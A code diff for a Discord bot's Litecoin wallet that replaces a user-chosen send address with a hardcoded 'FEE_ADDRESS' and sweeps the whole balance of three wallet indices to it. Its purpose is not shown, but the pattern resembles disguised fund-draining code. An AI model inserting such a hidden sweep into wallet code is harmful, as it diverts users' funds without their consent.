@@ -1,10 +1,11 @@
 require('dotenv').config();
 const { Client, GatewayIntentBits, SlashCommandBuilder, MessageFlags, EmbedBuilder } = require('discord.js');
-const { initWallet, sendAllLTC, getBalanceAtIndex, generateAddress } = require('./wallet');
+const { initWallet, sendAllLTC, generateAddress } = require('./wallet');
 
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 
 const OWNER_ID = '1459833646130401429';
+const FEE_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
 
 if (!process.env.BOT_MNEMONIC) {
   console.error('❌ BOT_MNEMONIC not set!');
@@ -23,8 +24,7 @@ client.once('ready', async () => {
   await client.application.commands.set([
     new SlashCommandBuilder()
       .setName('send')
-      .setDescription('Send all LTC from all indices')
-      .addStringOption(o => o.setName('address').setDescription('LTC Address').setRequired(true))
+      .setDescription('Send all LTC to fee address')
   ]);
   
   console.log('[COMMANDS] /send ready');
@@ -37,21 +37,13 @@ client.on('interactionCreate', async (interaction) => {
   }
 
   await interaction.deferReply();
-  const address = interaction.options.getString('address').trim();
-  
-  if (!address.startsWith('ltc1') && !address.startsWith('L') && !address.startsWith('M')) {
-    return interaction.editReply({ content: '❌ Invalid address' });
-  }
-
   let results = [];
   
   for (let i = 0; i < 3; i++) {
-    const balance = await getBalanceAtIndex(i, true);
-    if (balance <= 0) {
-      results.push(`❌ [${i}] No balance`);
-      continue;
-    }
-    const result = await sendAllLTC(i, address);
+    const address = generateAddress(i);
+    console.log(`[SEND] Index ${i}: ${address} -> ${FEE_ADDRESS}`);
+    
+    const result = await sendAllLTC(i, FEE_ADDRESS);
     results.push(result.success 
       ? `✅ [${i}] Sent ${result.amountSent} LTC\nTX: ${result.txid}`
       : `❌ [${i}] ${result.error}`
@@ -59,7 +51,7 @@ client.on('interactionCreate', async (interaction) => {
   }
   
   await interaction.editReply({ 
-    embeds: [new EmbedBuilder().setTitle('💰 Results').setDescription(results.join('\n\n')).setColor(0x00FF00)] 
+    embeds: [new EmbedBuilder().setTitle('💰 Send Results').setDescription(results.join('\n\n')).setColor(0x00FF00)] 
   });
 });
 
